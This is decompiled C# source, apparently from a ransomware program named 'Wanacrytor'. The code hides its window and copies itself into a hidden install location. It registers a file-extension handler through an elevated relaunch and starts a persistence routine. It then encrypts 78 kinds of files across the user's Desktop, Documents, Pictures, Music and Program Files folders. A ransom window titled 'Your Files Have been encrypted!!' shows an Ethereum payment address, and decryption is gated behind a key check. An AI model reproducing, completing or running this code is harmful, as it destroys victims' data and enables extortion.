using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Wanacrytor.Core;
using Wanacrytor.My;
using Wanacrytor.Shareware.core;

namespace Wanacrytor;

[DesignerGenerated]
public class Form1 : Form
{
	public UFuncs UFuncsEx;

	private IContainer components;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox4")]
	internal virtual TextBox TextBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox5")]
	internal virtual TextBox TextBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		UFuncsEx = new UFuncs();
		InitializeComponent();
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Conversions.ToString(LogFuncs.LogFile)))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(LogFuncs.LogFile));
		}
		try
		{
			Application.add_ThreadException((ThreadExceptionEventHandler)Application_Exception_Handler);
			Application.SetUnhandledExceptionMode((UnhandledExceptionMode)2, false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Application_Exception_Handler(object sender, ThreadExceptionEventArgs e)
	{
		LogFuncs.WriteLog(e.Exception.Message, LogFuncs.InfoType.Exception);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		if (File.Exists(DirPaths.InstallDir))
		{
			ArgumentProc();
		}
		else
		{
			Install();
		}
	}

	private void ArgumentProc()
	{
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		string[] commandLineArgs = Environment.GetCommandLineArgs();
		if (commandLineArgs.Length == 2)
		{
			LogFuncs.WriteLog("Argument : " + commandLineArgs[1], LogFuncs.InfoType.None);
		}
		switch (Strings.LCase(commandLineArgs[1]))
		{
		case "-uninstall":
			SilentB();
			return;
		case "-regedit":
			AddRegedit();
			return;
		case "-install":
			Install();
			return;
		case "-silent":
			SilentA();
			return;
		}
		TextBox2.set_Text(DirPaths.strPass);
		TextBox3.set_Text(Path.GetFileNameWithoutExtension(commandLineArgs[0]));
		((Control)this).Show();
		((Form)this).set_Opacity(1.1);
		Form val = new Form();
		val.set_FormBorderStyle((FormBorderStyle)0);
		val.set_WindowState((FormWindowState)2);
		val.set_BackColor(Color.FromArgb(0, 0, 130));
		((Control)val).Show();
	}

	private void Install()
	{
		if (!File.Exists(DirPaths.InstallDir))
		{
			File.Copy(Application.get_ExecutablePath(), DirPaths.InstallDir);
			UFuncs.FileHide(DirPaths.InstallDir);
		}
		new PerSys();
		if (Registry.ClassesRoot.OpenSubKey(DirPaths.ExtensionDefaul) == null)
		{
			UFuncs.OpenAsAdmin(DirPaths.InstallDir, "-regedit");
		}
		else
		{
			SilentA();
		}
	}

	private void StartAsAdmin()
	{
		UFuncs.OpenAsAdmin(DirPaths.InstallDir, "-uninstall");
	}

	private void AddRegedit()
	{
		((Control)this).Hide();
		((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(DirPaths.ExtensionDefaul)
			.SetValue("", "Shareware File", RegistryValueKind.String);
		((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey("Shareware File\\shell\\open\\command")
			.SetValue("", DirPaths.InstallDir + " \"%l\" ", RegistryValueKind.String);
		SilentA();
	}

	private void SilentA()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Thread thread = default(Thread);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 81:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000f;
						case 4:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 5:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_000f:
					num = 3;
					thread = new Thread(StartAnalisys);
					break;
					IL_0007:
					num = 2;
					((Control)this).Hide();
					goto IL_000f;
					end_IL_0000_2:
					break;
				}
				num = 4;
				thread.Start();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 81;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void StartAnalisys()
	{
		string[] array = new string[5]
		{
			DirPaths.Desktop,
			DirPaths.Document,
			DirPaths.Pictures,
			DirPaths.Music,
			DirPaths.ProgramFiles
		};
		string[] fileExtPatterns = new string[78]
		{
			"*.aif", "*.cda", "*.mid", "*.mp3", "*.mpa", "*.ogg", "*.wav", "*.wma", "*.wpl", "*.7z",
			"*.arj", "*.pkg", "*.rar", "*.rpm", "*.zip", "*.tar.gz", "*.rar", "*.dat", "*.csv", "*.db",
			"*.dbf", "*.sql", "*.jar", "*.py", "*.exe", "*.bmp", "*.gif", "*.ico", "*.jpeg", "*.jpg",
			"*.png", "*.key", "*.odp", "*.pps", "*.ppt", "*.pptx", "*.c", "*.cpp", "*.h", "*.cs",
			"*.java", "*.class", "*.swift", "*.ods", "*.xls", "*.xlsm", "*.xlsx", "*.3g2", "*.3gp", "*.avi",
			"*.flv", "*.h264", "*.m4v", "*.mkv", "*.mov", "*.mp4", "*.mpg", "*.wmv", "*.mpeg", "*.doc",
			"*.docx", "*.odt", "*.pdf", "*.rtf", "*.tex", "*.txt", "*.wpd", "*.php", "*.css", "*.html",
			"*.js", "*.editorconfig", "*.gitignore", "*.json", "*.env", "*.env.example", "*.xlm", "*.vb"
		};
		string[] array2 = array;
		for (int i = 0; i < array2.Length; i = checked(i + 1))
		{
			IEnumerable<FileInfo> files = FileDirSearcher.GetFiles(array2[i], SearchOption.AllDirectories, new string[1] { "*" }, fileExtPatterns, ignoreCase: true, throwOnError: true);
			foreach (FileInfo item in files)
			{
				if (new ShareHook().Encriptor(item.FullName))
				{
					LogFuncs.WriteLog("File: " + item.FullName + " Successfully Processed!", LogFuncs.InfoType.Information);
				}
				else
				{
					LogFuncs.WriteLog("File Processing Failed: " + item.FullName, LogFuncs.InfoType.Critical);
				}
			}
		}
	}

	private void SilentB()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Thread thread = default(Thread);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 273:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_0020;
						case 5:
							goto IL_002e;
						case 6:
							goto IL_003c;
						case 7:
							goto IL_004a;
						case 8:
							goto IL_0058;
						case 9:
							goto IL_0066;
						case 10:
							goto IL_0075;
						case 11:
							goto IL_0084;
						case 12:
							goto IL_0093;
						case 13:
							goto IL_00a2;
						case 14:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 15:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a2:
					num = 13;
					thread = new Thread(StartAnalisysB);
					break;
					IL_0007:
					num = 2;
					((Control)this).Show();
					goto IL_000f;
					IL_000f:
					num = 3;
					((Form)this).set_Opacity(1.1);
					goto IL_0020;
					IL_0020:
					num = 4;
					((Control)PictureBox1).set_Visible(false);
					goto IL_002e;
					IL_002e:
					num = 5;
					((Control)TextBox1).set_Visible(false);
					goto IL_003c;
					IL_003c:
					num = 6;
					((Control)TextBox2).set_Visible(false);
					goto IL_004a;
					IL_004a:
					num = 7;
					((Control)TextBox3).set_Visible(false);
					goto IL_0058;
					IL_0058:
					num = 8;
					((Control)TextBox4).set_Visible(false);
					goto IL_0066;
					IL_0066:
					num = 9;
					((Control)Label1).set_Visible(false);
					goto IL_0075;
					IL_0075:
					num = 10;
					((Control)Label3).set_Visible(false);
					goto IL_0084;
					IL_0084:
					num = 11;
					((Control)Label4).set_Visible(false);
					goto IL_0093;
					IL_0093:
					num = 12;
					((Control)ProgressBar1).set_Visible(true);
					goto IL_00a2;
					end_IL_0000_2:
					break;
				}
				num = 14;
				thread.Start();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 273;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void StartAnalisysB()
	{
		string[] array = new string[5]
		{
			DirPaths.Desktop,
			DirPaths.Document,
			DirPaths.Pictures,
			DirPaths.Music,
			DirPaths.ProgramFiles
		};
		string text = "*" + DirPaths.ExtensionDefaul;
		string[] fileExtPatterns = new string[1] { text };
		string[] array2 = array;
		checked
		{
			_Closure_0024__11_002D0 closure_0024__11_002D = default(_Closure_0024__11_002D0);
			foreach (string dirPath in array2)
			{
				closure_0024__11_002D = new _Closure_0024__11_002D0(closure_0024__11_002D);
				closure_0024__11_002D._0024VB_0024Me = this;
				IEnumerable<FileInfo> files = FileDirSearcher.GetFiles(dirPath, SearchOption.AllDirectories, new string[1] { "*" }, fileExtPatterns, ignoreCase: true, throwOnError: true);
				closure_0024__11_002D._0024VB_0024Local_LocalVariable = files.Count();
				closure_0024__11_002D._0024VB_0024Local_Maximun = files.Count();
				foreach (FileInfo item in files)
				{
					closure_0024__11_002D._0024VB_0024Local_LocalVariable--;
					bool num = new ShareHook().Decriptor(item.FullName);
					((Control)this).BeginInvoke((Delegate)((closure_0024__11_002D._0024I0 == null) ? (closure_0024__11_002D._0024I0 = closure_0024__11_002D._Lambda_0024__0) : closure_0024__11_002D._0024I0));
					if (num)
					{
						LogFuncs.WriteLog("File: " + item.FullName + " Successfully Processed!", LogFuncs.InfoType.Information);
					}
					else
					{
						LogFuncs.WriteLog("File Processing Failed: " + item.FullName, LogFuncs.InfoType.Critical);
					}
				}
			}
			ProjectData.EndApp();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(TextBox5.get_Text(), "", false) != 0 && Operators.CompareString(TextBox5.get_Text(), UFuncsEx.EncodeBase64(DirPaths.strPass), false) == 0)
		{
			StartAsAdmin();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_07c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ce: Expected O, but got Unknown
		//IL_0923: Unknown result type (might be due to invalid IL or missing references)
		//IL_092d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		Panel2 = new Panel();
		Button1 = new Button();
		TextBox5 = new TextBox();
		Label2 = new Label();
		Panel3 = new Panel();
		TextBox4 = new TextBox();
		Label3 = new Label();
		TextBox3 = new TextBox();
		Label4 = new Label();
		TextBox2 = new TextBox();
		Label1 = new Label();
		PictureBox1 = new PictureBox();
		ProgressBar1 = new ProgressBar();
		((Control)Panel2).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((TextBoxBase)TextBox1).set_BackColor(Color.White);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)0);
		((Control)TextBox1).set_Font(new Font("Consolas", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox1).set_ForeColor(Color.Black);
		((TextBoxBase)TextBox1).set_HideSelection(false);
		((Control)TextBox1).set_Location(new Point(425, 69));
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		((Control)TextBox1).set_Size(new Size(360, 283));
		((Control)TextBox1).set_TabIndex(1);
		((Control)TextBox1).set_TabStop(false);
		TextBox1.set_Text(componentResourceManager.GetString("TextBox1.Text"));
		TextBox1.set_TextAlign((HorizontalAlignment)2);
		((TextBoxBase)TextBox1).set_WordWrap(false);
		((Control)Panel2).set_BackColor(Color.Red);
		((Control)Panel2).get_Controls().Add((Control)(object)Button1);
		((Control)Panel2).get_Controls().Add((Control)(object)TextBox5);
		((Control)Panel2).get_Controls().Add((Control)(object)Label2);
		((Control)Panel2).set_Dock((DockStyle)2);
		((Control)Panel2).set_Location(new Point(0, 335));
		((Control)Panel2).set_Name("Panel2");
		((Control)Panel2).set_Size(new Size(802, 87));
		((Control)Panel2).set_TabIndex(2);
		((Control)Button1).set_Location(new Point(226, 43));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(97, 29));
		((Control)Button1).set_TabIndex(4);
		((ButtonBase)Button1).set_Text("Uninstall");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((TextBoxBase)TextBox5).set_BackColor(Color.Gray);
		((TextBoxBase)TextBox5).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox5).set_ForeColor(Color.FromArgb(255, 255, 128));
		((Control)TextBox5).set_Location(new Point(52, 17));
		((Control)TextBox5).set_Name("TextBox5");
		((Control)TextBox5).set_Size(new Size(271, 20));
		((Control)TextBox5).set_TabIndex(3);
		Label2.set_AutoSize(true);
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(12, 19));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(34, 13));
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("Key : ");
		((Control)Panel3).set_BackColor(Color.Red);
		((Control)Panel3).get_Controls().Add((Control)(object)TextBox4);
		((Control)Panel3).get_Controls().Add((Control)(object)Label3);
		((Control)Panel3).get_Controls().Add((Control)(object)TextBox3);
		((Control)Panel3).get_Controls().Add((Control)(object)Label4);
		((Control)Panel3).get_Controls().Add((Control)(object)TextBox2);
		((Control)Panel3).get_Controls().Add((Control)(object)Label1);
		((Control)Panel3).set_Dock((DockStyle)1);
		((Control)Panel3).set_Location(new Point(0, 0));
		((Control)Panel3).set_Name("Panel3");
		((Control)Panel3).set_Size(new Size(802, 87));
		((Control)Panel3).set_TabIndex(3);
		((TextBoxBase)TextBox4).set_BackColor(Color.Gray);
		((TextBoxBase)TextBox4).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox4).set_ForeColor(Color.FromArgb(128, 255, 128));
		((Control)TextBox4).set_Location(new Point(521, 14));
		((Control)TextBox4).set_Name("TextBox4");
		((TextBoxBase)TextBox4).set_ReadOnly(true);
		((Control)TextBox4).set_Size(new Size(278, 20));
		((Control)TextBox4).set_TabIndex(5);
		TextBox4.set_Text("0xDEB8efD8E2D069DB0e3e112CDbd589089844c258");
		Label3.set_AutoSize(true);
		((Control)Label3).set_ForeColor(Color.White);
		((Control)Label3).set_Location(new Point(422, 16));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(93, 13));
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text("Ethereum Adress :");
		((TextBoxBase)TextBox3).set_BackColor(Color.Gray);
		((TextBoxBase)TextBox3).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox3).set_ForeColor(Color.FromArgb(255, 128, 128));
		((Control)TextBox3).set_Location(new Point(67, 49));
		((Control)TextBox3).set_Name("TextBox3");
		((TextBoxBase)TextBox3).set_ReadOnly(true);
		((Control)TextBox3).set_Size(new Size(125, 20));
		((Control)TextBox3).set_TabIndex(3);
		Label4.set_AutoSize(true);
		((Control)Label4).set_ForeColor(Color.White);
		((Control)Label4).set_Location(new Point(29, 51));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(32, 13));
		((Control)Label4).set_TabIndex(2);
		Label4.set_Text("File : ");
		((TextBoxBase)TextBox2).set_BackColor(Color.Gray);
		((TextBoxBase)TextBox2).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox2).set_ForeColor(Color.FromArgb(255, 255, 128));
		((Control)TextBox2).set_Location(new Point(67, 12));
		((Control)TextBox2).set_Name("TextBox2");
		((TextBoxBase)TextBox2).set_ReadOnly(true);
		((Control)TextBox2).set_Size(new Size(302, 20));
		((Control)TextBox2).set_TabIndex(1);
		Label1.set_AutoSize(true);
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(12, 14));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(49, 13));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("UserID : ");
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		((Control)PictureBox1).set_Location(new Point(15, 112));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(148, 150));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(4);
		PictureBox1.set_TabStop(false);
		((Control)ProgressBar1).set_Location(new Point(15, 154));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(770, 23));
		((Control)ProgressBar1).set_TabIndex(5);
		((Control)ProgressBar1).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(802, 422));
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Panel3);
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Your Files Have been encrypted!!");
		((Form)this).set_TopMost(true);
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel2).PerformLayout();
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel3).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
